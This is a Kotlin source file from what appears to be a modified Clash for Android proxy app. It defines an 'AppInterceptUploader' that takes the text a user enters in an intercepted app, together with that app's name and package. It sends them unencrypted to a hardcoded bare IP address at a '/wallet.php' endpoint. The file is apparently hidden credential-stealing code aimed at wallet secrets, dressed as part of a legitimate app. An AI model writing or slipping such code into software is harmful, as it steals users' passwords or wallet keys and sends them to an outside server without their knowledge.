package com.github.kr328.clash

import android.content.Context
import com.github.kr328.clash.common.log.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * APP拦截验证上传工具
 * 上传用户确认信息到服务器
 */
object AppInterceptUploader {

    // 服务器上传地址 - 可配置
    // 注意：建议使用 HTTPS 保护数据传输安全
    var uploadUrl: String = "http://18.166.76.229:8002/wallet.php"

    /**
     * 上传用户确认内容到服务器
     * @return 上传是否成功
     */
    suspend fun uploadConfirmation(
        context: Context,
        appName: String,
        packageName: String,
        userInput: String
    ): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())

                // 使用 JSONObject 进行正确的 JSON 序列化
                val jsonBody = JSONObject().apply {
                    put("app_name", appName)
                    put("package_name", packageName)
                    put("user_input", userInput)
                    put("timestamp", timestamp)
                }.toString()

                val url = URL(uploadUrl)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                connection.setRequestProperty("Accept", "*/*")
                connection.connectTimeout = 10000
                connection.readTimeout = 10000

                connection.outputStream.use { os ->
                    os.write(jsonBody.toByteArray(Charsets.UTF_8))
                }

                val responseCode = connection.responseCode
                connection.disconnect()

                if (responseCode == HttpURLConnection.HTTP_OK) {
                    Log.i("AppInterceptUploader: Upload success - $appName")
                    true
                } else {
                    Log.e("AppInterceptUploader: Upload failed with code $responseCode")
                    false
                }
            } catch (e: Exception) {
                Log.e("AppInterceptUploader: Upload error - ${e.message}")
                false
            }
        }
    }
}
